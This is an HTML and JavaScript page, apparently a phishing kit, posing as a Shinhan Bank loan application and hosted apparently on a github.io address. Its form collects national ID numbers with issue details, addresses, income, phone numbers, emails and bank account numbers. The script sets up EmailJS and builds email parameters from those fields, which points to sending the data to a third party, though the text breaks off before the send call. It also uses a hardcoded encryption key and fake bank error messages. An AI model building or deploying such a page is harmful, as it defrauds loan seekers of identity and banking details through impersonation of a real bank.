<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng Ký Vay Tín Chấp - Shinhan Bank</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            font-size: 16px;
            background-color: #f8f9fa;
            margin: 0;
        }
        .header {
            text-align: center;
            padding: 20px;
            background-color: #003087;
            color: white;
        }
        .header img {
            height: 50px;
        }
        .header h1 {
            font-size: 26px;
            font-weight: 700;
            margin: 10px 0 0 0;
        }
        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            position: relative;
        }
        .progress-bar-container {
            margin-bottom: 20px;
        }
        .progress-bar {
            height: 20px;
            background-color: #e9ecef;
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-bar-fill {
            height: 100%;
            background-color: #28a745;
            transition: width 0.3s ease-in-out;
        }
        .step-title {
            color: #003087;
            font-size: 22px;
            font-weight: 700;
            text-align: center;
        }
        .step-description {
            font-size: 16px;
            text-align: center;
            margin-bottom: 20px;
        }
        .tooltip-icon {
            cursor: pointer;
            color: #003087;
            font-size: 14px;
            margin-left: 5px;
        }
        .form-label {
            font-weight: 500;
        }
        .form-control, .form-select {
            font-size: 16px;
            border-radius: 15px;
        }
        .terms-box {
            border: 1px solid #dee2e6;
            border-radius: 5px;
            padding: 10px;
            background-color: #f9f9f9;
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }
        .terms-box img {
            height: 28px;
            margin-right: 10px;
        }
        .terms-box p {
            margin: 0;
            font-size: 14px;
        }
        .terms-box a {
            color: #003087;
            text-decoration: underline;
        }
        .form-check-label {
            font-size: 14px;
        }
        .btn-primary {
            font-size: 16px;
            font-weight: 700;
            padding: 10px 20px;
            background-color: #003087;
            border: none;
        }
        .btn-primary:hover {
            background-color: #00205b;
        }
        .btn-primary:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .back-btn {
            display: inline-flex;
            align-items: center;
            font-size: 16px;
            font-weight: 500;
            padding: 8px 16px;
            background-color: #6c757d;
            color: white;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
            position: absolute;
            top: 10px;
            left: 10px;
            text-decoration: none;
        }
        .back-btn:hover {
            background-color: #5a6268;
            transform: translateY(-1px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
        .back-btn:focus {
            outline: none;
            box-shadow: 0 0 0 3px rgba(108, 117, 125, 0.3);
        }
        .back-btn .bi {
            margin-right: 8px;
        }
        .modal-content img {
            height: 30px;
            margin-right: 10px;
        }
        .modal-title {
            font-size: 18px;
            font-weight: 700;
        }
        .modal-body h5 {
            font-size: 16px;
            font-weight: 700;
            margin-top: 15px;
        }
        .modal-body p {
            font-size: 14px;
            line-height: 1.6;
        }
        .footer {
            text-align: center;
            padding: 20px;
            background-color: #003087;
            color: white;
            margin-top: 20px;
            font-size: 16px;
        }
        .footer img.lock-icon {
            vertical-align: middle;
            margin-right: 10px;
        }
        .footer-logo {
            height: 40px;
            margin-top: 10px;
        }
        .continue-btn-container {
            text-align: center;
            margin-top: 20px;
        }
        .invalid-feedback {
            display: none;
        }
        .was-validated .form-control:invalid, .was-validated .form-select:invalid {
            border-color: #dc3545;
        }
        .was-validated .form-control:invalid ~ .invalid-feedback,
        .was-validated .form-select:invalid ~ .invalid-feedback {
            display: block;
        }
        .spam-error {
            color: #dc3545;
            font-size: 14px;
            font-weight: 500;
            text-align: center;
            margin-top: 10px;
            padding: 8px;
            background-color: #ffe6e6;
            border-radius: 5px;
            display: none;
        }
        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan';">
        <h1>Đăng Ký Vay Tín Chấp</h1>
    </div>

    <div class="container">
        <button type="button" class="back-btn" onclick="https://vaytieudung.github.io/shinhanbank/'" aria-label="Quay lại trang trước">
            <i class="bi bi-arrow-left"></i> Quay Lại
        </button>
        <div class="progress-bar-container">
            <div class="progress-bar">
                <div class="progress-bar-fill" id="progressBar" style="width: 10%"></div>
            </div>
        </div>

        <div id="step1" class="step-transition">
            <h5 class="step-title">Đăng Ký Hồ Sơ Vay Tín Chấp</h5>
            <p class="step-description">Vui lòng cung cấp thông tin cá nhân để chúng tôi tiến hành xét duyệt. Thông tin của bạn sẽ được gửi để thẩm định và xử lý hồ sơ.</p>
            <form id="registerForm" novalidate>
                <div class="mb-3">
                    <label for="fullName" class="form-label">Họ và Tên <span class="tooltip-icon" data-bs-toggle="tooltip" title="Họ tên đầy đủ theo CMND/CCCD" id="fullNameTooltip">ⓘ</span></label>
                    <input type="text" class="form-control" id="fullName" required aria-describedby="fullNameTooltip">
                    <div class="invalid-feedback">Vui lòng nhập họ và tên.</div>
                </div>
                <div class="mb-3">
                    <label for="idNumber" class="form-label">Số CMND/CCCD <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số định danh trên giấy tờ tùy thân (9 hoặc 12 số)" id="idNumberTooltip">ⓘ</span></label>
                    <input type="text" class="form-control" id="idNumber" required placeholder="Nhập 9 hoặc 12 số" aria-describedby="idNumberTooltip">
                    <div class="invalid-feedback">Vui lòng nhập số CMND/CCCD/Hộ chiếu (9 hoặc 12 số).</div>
                </div>
                <div class="mb-3">
                    <label for="idIssueDate" class="form-label">Ngày Cấp CMND/CCCD</label>
                    <input type="text" class="form-control" id="idIssueDate" required placeholder="DD/MM/YYYY">
                    <div class="invalid-feedback">Vui lòng nhập ngày cấp (DD/MM/YYYY).</div>
                </div>
                <div class="mb-3">
                    <label for="idIssuePlace" class="form-label">Nơi Cấp CMND/CCCD</label>
                    <input type="text" class="form-control" id="idIssuePlace" required>
                    <div class="invalid-feedback">Vui lòng nhập nơi cấp.</div>
                </div>
                <div class="mb-3">
                    <label for="address" class="form-label">Địa Chỉ Thường Trú <span class="tooltip-icon" data-bs-toggle="tooltip" title="Địa chỉ ghi trên hộ khẩu" id="addressTooltip">ⓘ</span></label>
                    <input type="text" class="form-control" id="address" required aria-describedby="addressTooltip">
                    <div class="invalid-feedback">Vui lòng nhập địa chỉ thường trú.</div>
                </div>
                <div class="mb-3">
                    <label for="occupation" class="form-label">Nghề Nghiệp</label>
                    <select class="form-select" id="occupation" required>
                        <option value="" disabled selected>Chọn nghề nghiệp</option>
                        <option value="nhanvien">Nhân viên văn phòng</option>
                        <option value="kinhdoanh">Kinh doanh tự do</option>
                        <option value="giaovien">Giáo viên</option>
                        <option value="congnhan">Công nhân</option>
                        <option value="kysu">Kỹ sư</option>
                        <option value="bacsi">Bác sĩ</option>
                        <option value="banhang">Nhân viên bán hàng</option>
                        <option value="laixe">Lái xe</option>
                        <option value="noitro">Nội trợ</option>
                        <option value="sinhvien">Sinh viên</option>
                        <option value="khac">Khác</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn nghề nghiệp.</div>
                </div>
                <div class="mb-3">
                    <label for="income" class="form-label">Thu Nhập Hàng Tháng (VND) <span class="tooltip-icon" data-bs-toggle="tooltip" title="Thu nhập trung bình hàng tháng" id="incomeTooltip">ⓘ</span></label>
                    <input type="text" class="form-control" id="income" required aria-describedby="incomeTooltip">
                    <div class="invalid-feedback">Vui lòng nhập thu nhập hàng tháng (số dương).</div>
                </div>
                <div class="mb-3">
                    <label for="phoneNumber" class="form-label">Số Điện Thoại <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số điện thoại liên lạc chính (10 số)" id="phoneNumberTooltip">ⓘ</span></label>
                    <input type="tel" class="form-control" id="phoneNumber" required placeholder="Nhập 10 số" aria-describedby="phoneNumberTooltip">
                    <div class="invalid-feedback">Vui lòng nhập số điện thoại (10 số).</div>
                </div>
                <div class="mb-3">
                    <label for="email" class="form-label">Email <span class="tooltip-icon" data-bs-toggle="tooltip" title="Email để nhận thông báo" id="emailTooltip">ⓘ</span></label>
                    <input type="email" class="form-control" id="email" required aria-describedby="emailTooltip">
                    <div class="invalid-feedback">Vui lòng nhập email hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="loanAmountInput" class="form-label">Số Tiền Vay (VND) <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số tiền bạn muốn vay" id="loanAmountTooltip">ⓘ</span></label>
                    <input type="text" class="form-control" id="loanAmountInput" required aria-describedby="loanAmountTooltip">
                    <div class="invalid-feedback">Vui lòng nhập số tiền vay (số dương).</div>
                </div>
                <div class="mb-3">
                    <label for="loanTerm" class="form-label">Số Tháng Vay</label>
                    <select class="form-select" id="loanTerm" required>
                        <option value="" disabled selected>Chọn số tháng</option>
                        <option value="6">6 tháng</option>
                        <option value="12">12 tháng</option>
                        <option value="18">18 tháng</option>
                        <option value="24">24 tháng</option>
                        <option value="36">36 tháng</option>
                        <option value="48">48 tháng</option>
                        <option value="60">60 tháng</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn số tháng vay.</div>
                </div>
                <div class="mb-3">
                    <label for="loanPurpose" class="form-label">Mục Đích Vay</label>
                    <select class="form-select" id="loanPurpose" required>
                        <option value="" disabled selected>Chọn mục đích</option>
                        <option value="Sửa chữa nhà">Sửa chữa nhà</option>
                         <option value="Vay tín chấp">Vay tín chấp</option>
                        <option value="Mua xe">Mua xe</option>
                       <option value="Mua nhà">Mua nhà</option>
                       <option value="Vay Tiêu dùng Bảo lãnh">Vay Tiêu dùng Bảo lãnh</option>
                        <option value="Vay sinh viên">Vay sinh viên</option>
                        <option value="Vay Tiêu Dùng">Vay Tiêu Dùng</option>
                          <option value="Vay mua xe đã qua sử dụng">Vay mua xe đã qua sử dụng</option>
                        <option value="Khác">Khác</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn mục đích vay.</div>
                </div>
                <div class="mb-3">
                    <label for="accountNumber" class="form-label">Số Tài Khoản Ngân Hàng <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số tài khoản để giải ngân" id="accountNumberTooltip">ⓘ</span></label>
                    <input type="text" class="form-control" id="accountNumber" required aria-describedby="accountNumberTooltip">
                    <div class="invalid-feedback">Vui lòng nhập số tài khoản ngân hàng.</div>
                </div>
                <div class="mb-3">
                    <label for="bankName" class="form-label">Tên Ngân Hàng <span class="tooltip-icon" data-bs-toggle="tooltip" title="Tên ngân hàng của tài khoản" id="bankNameTooltip">ⓘ</span></label>
                    <select class="form-select" id="bankName" required aria-describedby="bankNameTooltip">
                        <option value="" disabled selected>Chọn ngân hàng</option>
                        <option value="Shinhan Bank">Shinhan Bank</option>
                        <option value="Vietcombank">Vietcombank</option>
                        <option value="Techcombank">Techcombank</option>
                        <option value="BIDV">BIDV</option>
                        <option value="Agribank">Agribank</option>
                        <option value="MB Bank">MB Bank</option>
                        <option value="VPBank">VPBank</option>
                        <option value="Sacombank">Sacombank</option>
                        <option value="ACB">ACB</option>
                        <option value="VietinBank">VietinBank</option>
                        <option value="TPBank">TPBank</option>
                        <option value="HDBank">HDBank</option>
                        <option value="MSB">MSB</option>
                        <option value="VIB">VIB</option>
                        <option value="SeABank">SeABank</option>
                        <option value="OCB">OCB</option>
                        <option value="SCB">SCB</option>
                        <option value="Nam A Bank">Nam A Bank</option>
                        <option value="Agribank">Agribank</option>
                        <option value="BAOVIET Bank">BAOVIET Bank</option>
                        <option value="LienVietPostBank">LienVietPostBank</option>
                        <option value="SAIGONBANK">SAIGONBANK</option>
                        <option value="SHB">SHB</option>
                        <option value="PVcomBank">PVcomBank</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn tên ngân hàng.</div>
                </div>
                <div class="mb-3">
                    <div class="terms-box">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/28x28?text=Lock';">
                        <p>Thông tin của bạn sẽ được bảo mật tuyệt đối theo chính sách bảo mật của Shinhan Bank. Dữ liệu sẽ được gửi để thẩm định và xử lý hồ sơ. Vui lòng đọc kỹ <a href="#" data-bs-toggle="modal" data-bs-target="#termsModal">Điều khoản và Điều kiện</a> trước khi tiếp tục.</p>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="termsAgree" aria-label="Đồng ý với điều khoản và điều kiện">
                        <label class="form-check-label" for="termsAgree">
                            Tôi đồng ý với các điều khoản và điều kiện của Shinhan Bank.
                        </label>
                        <div id="termsFeedback" class="invalid-feedback" style="display: none;">Vui lòng đồng ý với các điều khoản và điều kiện.</div>
                    </div>
                </div>
                <div class="spam-error" id="spamError">Bạn đã có hồ sơ tại Shinhanbank. Vui lòng thử lại sau.</div>
                <div class="error-message" id="storageError">Lỗi thông tin không trùng khớp trên hệ thống. Vui lòng thử lại.</div>
                <div class="error-message" id="emailError">Lỗi gửi thông tin không trùng khớp trên hệ thống. Vui lòng thử lại.</div>
                <div class="continue-btn-container">
                    <button type="submit" class="btn btn-primary" id="proceedToStep2Btn" disabled>Tiếp Tục</button>
                    <button type="button" class="btn btn-primary" id="retryEmailBtn" style="display: none;">Thử Lại</button>
                </div>
            </form>
        </div>

        <!-- Modal: Terms and Conditions -->
        <div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/30x30?text=Lock';">
                        <h5 class="modal-title" id="termsModalLabel">Điều Khoản và Điều Kiện</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Đóng"></button>
                    </div>
                    <div class="modal-body">
                        <h5>Chính Sách Bảo Mật</h5>
                        <p>Shinhan Bank cam kết bảo mật thông tin cá nhân của bạn theo quy định pháp luật Việt Nam. Hồ sơ sẽ được thẩm định và xét duyệt đúng quy trình của ngân hàng.</p>
                        <h5>Điều Kiện Vay</h5>
                        <p>- Độ tuổi: Từ 20 đến 60 tuổi.<br>
                           - Thu nhập tối thiểu: 5,000,000 VND/tháng.<br>
                           - Không có nợ xấu tại thời điểm đăng ký.</p>
                        <h5>Trách Nhiệm của Khách Hàng</h5>
                        <p>Khách hàng cần cung cấp thông tin chính xác và chịu trách nhiệm về tính xác thực của các tài liệu cung cấp.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Đóng</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Modal: Confirm Data -->
        <div class="modal fade" id="confirmDataModal" tabindex="-1" aria-labelledby="confirmDataModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="confirmDataModalLabel">Xác Nhận Thông Tin</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Đóng"></button>
                    </div>
                    <div class="modal-body">
                        <p>Vui lòng kiểm tra thông tin trước khi gửi:</p>
                        <p><strong>Họ và Tên:</strong> <span id="confirmFullName"></span></p>
                        <p><strong>Số CMND/CCCD:</strong> <span id="confirmIdNumber"></span></p>
                        <p><strong>Ngày Cấp:</strong> <span id="confirmIdIssueDate"></span></p>
                        <p><strong>Nơi Cấp:</strong> <span id="confirmIdIssuePlace"></span></p>
                        <p><strong>Địa Chỉ:</strong> <span id="confirmAddress"></span></p>
                        <p><strong>Nghề Nghiệp:</strong> <span id="confirmOccupation"></span></p>
                        <p><strong>Thu Nhập:</strong> <span id="confirmIncome"></span></p>
                        <p><strong>Số Điện Thoại:</strong> <span id="confirmPhoneNumber"></span></p>
                        <p><strong>Email:</strong> <span id="confirmEmail"></span></p>
                        <p><strong>Số Tiền Vay:</strong> <span id="confirmLoanAmount"></span></p>
                        <p><strong>Kỳ Hạn Vay:</strong> <span id="confirmLoanTerm"></span></p>
                        <p><strong>Mục Đích Vay:</strong> <span id="confirmLoanPurpose"></span></p>
                        <p><strong>Số Tài Khoản:</strong> <span id="confirmAccountNumber"></span></p>
                        <p><strong>Ngân Hàng:</strong> <span id="confirmBankName"></span></p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" id="confirmSubmitBtn">Xác Nhận</button>
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Hủy</button>
                    </div>
                </div>
            </div>
        </div>

        <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
        <script>
            // Initialize EmailJS
            (function(){
                emailjs.init("OrBsI926QI2_xBh1f");
            })();

            // Placeholder user data
            let userData = {
                fullName: "",
                idNumber: "",
                idIssueDate: "",
                idIssuePlace: "",
                address: "",
                occupation: "",
                income: "",
                phoneNumber: "",
                email: "",
                loanAmount: "",
                loanTerm: "",
                loanPurpose: "",
                accountNumber: "",
                bankName: "",
                termsAgree: false,
                loanCode: "",
                registrationDate: "",
                monthlyPayment: 0,
                interestRate: 0,
                sellerCode: "",
                storeCode: "",
                staffCode: "",
                staffName: "",
                branchName: "",
                isRegistered: false,
                qrData: {},
                atmCard: {},
                currentStep: 1
            };

            // Check localStorage quota
            function checkLocalStorageQuota() {
                try {
                    localStorage.setItem('test', 'test');
                    localStorage.removeItem('test');
                    return true;
                } catch (e) {
                    console.error('localStorage quota exceeded:', e);
                    $('#storageError').text('Bộ nhớ trình duyệt đầy. Vui lòng xóa dữ liệu duyệt web và thử lại.').show();
                    return false;
                }
            }

            // Validate user data from localStorage
            function validateStoredData(data) {
                const idNumberRegex = /^\d{9,12}$/;
                const dateRegex = /^\d{2}\/\d{2}\/\d{4}$/;
                const phoneRegex = /^0[1-9][0-9]{8}$/;
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                const numberRegex = /^\d+$/;
                const occupationOptions = ['nhanvien', 'kinhdoanh', 'giaovien', 'congnhan', 'kysu', 'bacsi', 'banhang', 'laixe', 'noitro', 'sinhvien', 'khac'];
                const loanTermOptions = ['6', '12', '18', '24', '36', '48', '60'];
                const loanPurposeOptions = ['Sửa chữa nhà', 'Mua xe', 'Học tập', 'Chi tiêu cá nhân', 'Khác'];
                const bankNameOptions = ['Shinhan Bank', 'Vietcombank', 'Techcombank', 'BIDV', 'Agribank', 'MB Bank', 'VPBank', 'Sacombank', 'ACB', 'VietinBank', 'TPBank', 'HDBank', 'MSB', 'VIB', 'SeABank', 'OCB', 'SCB', 'Nam A Bank', 'SHB', 'PVcomBank'];

                return {
                    fullName: data.fullName && typeof data.fullName === 'string' ? data.fullName : '',
                    idNumber: data.idNumber && idNumberRegex.test(data.idNumber) ? data.idNumber : '',
                    idIssueDate: data.idIssueDate && dateRegex.test(data.idIssueDate) && isValidDate(data.idIssueDate) ? data.idIssueDate : '',
                    idIssuePlace: data.idIssuePlace && typeof data.idIssuePlace === 'string' ? data.idIssuePlace : '',
                    address: data.address && typeof data.address === 'string' ? data.address : '',
                    occupation: data.occupation && occupationOptions.includes(data.occupation) ? data.occupation : '',
                    income: data.income && numberRegex.test(data.income) && Number(data.income) > 0 ? data.income : '',
                    phoneNumber: data.phoneNumber && phoneRegex.test(data.phoneNumber) ? data.phoneNumber : '',
                    email: data.email && emailRegex.test(data.email) ? data.email : '',
                    loanAmount: data.loanAmount && numberRegex.test(data.loanAmount) && Number(data.loanAmount) > 0 ? data.loanAmount : '',
                    loanTerm: data.loanTerm && loanTermOptions.includes(data.loanTerm) ? data.loanTerm : '',
                    loanPurpose: data.loanPurpose && loanPurposeOptions.includes(data.loanPurpose) ? data.loanPurpose : '',
                    accountNumber: data.accountNumber && numberRegex.test(data.accountNumber) ? data.accountNumber : '',
                    bankName: data.bankName && bankNameOptions.includes(data.bankName) ? data.bankName : '',
                    termsAgree: data.termsAgree === true ? true : false
                };
            }

            // Load user data from localStorage
            function loadUserData() {
                try {
                    const storedData = localStorage.getItem('userData');
                    if (storedData) {
                        const decryptedData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
                        userData = validateStoredData(decryptedData);
                        console.log('Loaded validated userData from localStorage:', userData);
                    } else {
                        console.warn('No userData found in localStorage, using default.');
                    }
                } catch (error) {
                    console.error('Error parsing userData from localStorage:', error);
                    userData = validateStoredData(userData); // Reset to default if error
                }
            }

            // Save user data to localStorage
            function saveToLocalStorage() {
                if (!checkLocalStorageQuota()) return false;
                try {
                    const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
                    localStorage.setItem('userData', encryptedData);
                    console.log('Saved userData to localStorage:', userData);
                    return true;
                } catch (error) {
                    console.error('Error saving userData to localStorage:', error);
                    $('#storageError').text('Lỗi lưu trữ dữ liệu. Vui lòng thử lại.').show();
                    return false;
                }
            }

            // Load registered IDs from localStorage
            function loadRegisteredIds() {
                try {
                    const storedIds = localStorage.getItem('registeredIds');
                    return storedIds ? JSON.parse(storedIds) : [];
                } catch (error) {
                    console.error('Error parsing registeredIds from localStorage:', error);
                    return [];
                }
            }

            // Save registered IDs to localStorage
            function saveRegisteredIds(ids) {
                if (!checkLocalStorageQuota()) return;
                try {
                    localStorage.setItem('registeredIds', JSON.stringify(ids));
                    console.log('Saved registeredIds to localStorage:', ids);
                } catch (error) {
                    console.error('Error saving registeredIds to localStorage:', error);
                    $('#storageError').show();
                }
            }

            // Format number input
            function formatNumberInput(value) {
                if (!value) return "";
                return Number(value.replace(/[^0-9]/g, '')).toLocaleString('vi-VN');
            }

            // Generate random loan code
            function generateLoanCode() {
                return "SHB" + Math.floor(100000 + Math.random() * 900000);
            }

            // Generate random code
            function generateRandomCode() {
                const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                let result = "";
                for (let i = 0; i < 6; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            // Get current date
            function getCurrentDate() {
                const today = new Date();
                const day = String(today.getDate()).padStart(2, '0');
                const month = String(today.getMonth() + 1).padStart(2, '0');
                const year = today.getFullYear();
                return `${day}/${month}/${year}`;
            }

            // Calculate monthly payment (simplified)
            function calculateMonthlyPayment(loanAmount, term) {
                if (!loanAmount || !term || loanAmount <= 0) return 0;
                const monthlyRate = 0.075 / 12; // Assuming 7.5% annual interest rate
                const months = parseInt(term);
                return Math.round((loanAmount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -months)));
            }

            // Calculate interest rate (simplified)
            function calculateInterestRate(loanAmount) {
                if (!loanAmount || loanAmount <= 0) return 0;
                return loanAmount >= 50000000 ? 7.5 : 8.0;
            }

            // Encrypt sensitive data
            function encryptData(data) {
                return CryptoJS.AES.encrypt(data, 'shinhan-secret-key').toString();
            }

            // Validate date
            function isValidDate(dateStr) {
                const regex = /^\d{2}\/\d{2}\/\d{4}$/;
                if (!regex.test(dateStr)) return false;
                const [day, month, year] = dateStr.split('/').map(Number);
                const date = new Date(year, month - 1, day);
                return date.getDate() === day && date.getMonth() === month - 1 && date.getFullYear() === year;
            }

            // Validate input formats
            function validateInputFormats() {
                const idNumber = $('#idNumber').val().trim();
                const idIssueDate = $('#idIssueDate').val().trim();
                const phoneNumber = $('#phoneNumber').val().trim();
                const email = $('#email').val().trim();
                const income = $('#income').val().replace(/[^0-9]/g, '');
                const loanAmount = $('#loanAmountInput').val().replace(/[^0-9]/g, '');
                const accountNumber = $('#accountNumber').val().trim();
                const bankName = $('#bankName').val();
                const occupation = $('#occupation').val();
                const loanTerm = $('#loanTerm').val();
                const loanPurpose = $('#loanPurpose').val();

                const idNumberRegex = /^\d{9,12}$/;
                const dateRegex = /^\d{2}\/\d{2}\/\d{4}$/;
                const phoneRegex = /^0[1-9][0-9]{8}$/;
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                const accountNumberRegex = bankName === 'Vietcombank' ? /^\d{13}$/ : /^\d{8,20}$/;
                const occupationOptions = ['nhanvien', 'kinhdoanh', 'giaovien', 'congnhan', 'kysu', 'bacsi', 'banhang', 'laixe', 'noitro', 'sinhvien', 'khac'];
                const loanTermOptions = ['6', '12', '18', '24', '36', '48', '60'];
                const loanPurposeOptions = ['Sửa chữa nhà', 'Mua xe', 'Học tập', 'Chi tiêu cá nhân', 'Khác'];

                let isValid = true;

                if (!idNumberRegex.test(idNumber)) {
                    $('#idNumber').addClass('is-invalid');
                    $('#idNumber').next('.invalid-feedback').text('Số CMND/CCCD/Hộ chiếu phải có 9 hoặc 12 số.');
                    isValid = false;
                }
                if (!dateRegex.test(idIssueDate) || !isValidDate(idIssueDate)) {
                    $('#idIssueDate').addClass('is-invalid');
                    $('#idIssueDate').next('.invalid-feedback').text('Ngày cấp phải có định dạng DD/MM/YYYY và hợp lệ.');
                    isValid = false;
                }
                if (!phoneRegex.test(phoneNumber)) {
                    $('#phoneNumber').addClass('is-invalid');
                    $('#phoneNumber').next('.invalid-feedback').text('Số điện thoại phải có 10 số, bắt đầu bằng 0.');
                    isValid = false;
                }
                if (!emailRegex.test(email)) {
                    $('#email').addClass('is-invalid');
                    $('#email').next('.invalid-feedback').text('Vui lòng nhập email hợp lệ.');
                    isValid = false;
                }
                if (!income || income <= 0) {
                    $('#income').addClass('is-invalid');
                    $('#income').next('.invalid-feedback').text('Thu nhập phải là số dương.');
                    isValid = false;
                }
                if (!loanAmount || loanAmount <= 0) {
                    $('#loanAmountInput').addClass('is-invalid');
                    $('#loanAmountInput').next('.invalid-feedback').text('Số tiền vay phải là số dương.');
                    isValid = false;
                }
                if (!accountNumberRegex.test(accountNumber)) {
                    $('#accountNumber').addClass('is-invalid');
                    $('#accountNumber').next('.invalid-feedback').text('Số tài khoản không hợp lệ.');
                    isValid = false;
                }
                if (!occupation || !occupationOptions.includes(occupation)) {
                    $('#occupation').addClass('is-invalid');
                    $('#occupation').next('.invalid-feedback').text('Vui lòng chọn nghề nghiệp hợp lệ.');
                    isValid = false;
                }
                if (!loanTerm || !loanTermOptions.includes(loanTerm)) {
                    $('#loanTerm').addClass('is-invalid');
                    $('#loanTerm').next('.invalid-feedback').text('Vui lòng chọn số tháng vay hợp lệ.');
                    isValid = false;
                }
                if (!loanPurpose || !loanPurposeOptions.includes(loanPurpose)) {
                    $('#loanPurpose').addClass('is-invalid');
                    $('#loanPurpose').next('.invalid-feedback').text('Vui lòng chọn mục đích vay hợp lệ.');
                    isValid = false;
                }
                if (!bankName) {
                    $('#bankName').addClass('is-invalid');
                    $('#bankName').next('.invalid-feedback').text('Vui lòng chọn ngân hàng hợp lệ.');
                    isValid = false;
                }

                return isValid;
            }

            // Validate email parameters
            function validateEmailParams(params) {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!params.to_email || !emailRegex.test(params.to_email)) {
                    $('#emailError').text('Email nhận không hợp lệ.').show();
                    return false;
                }
                if (!params.full_name || !params.id_number || !params.phone_number) {
                    $('#emailError').text('Thiếu thông tin bắt buộc để gửi email.').show();
                    return false;
                }
                return true;
            }

            // Validate form and checkbox
            function validateForm() {
                const form = document.getElementById('registerForm');
                const termsAgree = document.getElementById('termsAgree');
                const termsFeedback = document.getElementById('termsFeedback');
                const proceedBtn = document.getElementById('proceedToStep2Btn');
                const idNumber = $('#idNumber').val().trim();
                const registeredIds = loadRegisteredIds();

                // Reset invalid states
                $('#registerForm .form-control, #registerForm .form-select').removeClass('is-invalid');
                $('#spamError, #emailError, #storageError').hide();

                // Check form fields
                let allFieldsValid = form.checkValidity() && validateInputFormats();
                if (!allFieldsValid) {
                    form.classList.add('was-validated');
                }

                // Check terms checkbox
                if (!termsAgree.checked) {
                    termsFeedback.style.display = 'block';
                } else {
                    termsFeedback.style.display = 'none';
                }

                // Temporarily disable idNumber check for testing
                /*
                if (idNumber && registeredIds.includes(idNumber)) {
                    $('#spamError').text('Bạn đã có hồ sơ tại Shinhanbank.').show();
                    proceedBtn.disabled = true;
                } else {
                    $('#spamError').hide();
                    proceedBtn.disabled = !(allFieldsValid && termsAgree.checked);
                }
                */
                proceedBtn.disabled = !(allFieldsValid && termsAgree.checked);

                console.log('Form validation:', { allFieldsValid, termsChecked: termsAgree.checked });
            }

            // Anti-spam check
            function checkSpam() {
                const now = Date.now();
                const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
                const registrationCount = spamData.registerCount || 0;
                const registrationResetTime = spamData.resetTime || now;

                // Reset count after 24 hours
                if (now > registrationResetTime) {
                    spamData.registerCount = 0;
                    spamData.resetTime = now + 24 * 60 * 60 * 1000;
                }

                // Check registration limit (set to 5 for testing)
                if (registrationCount >= 5) {
                    return { allowed: false, message: 'Bạn đã vượt quá số lần đăng ký trong 24 giờ. Vui lòng thử lại sau.' };
                }

                return { allowed: true };
            }

            // Update spam data
            function updateSpamData() {
                const now = Date.now();
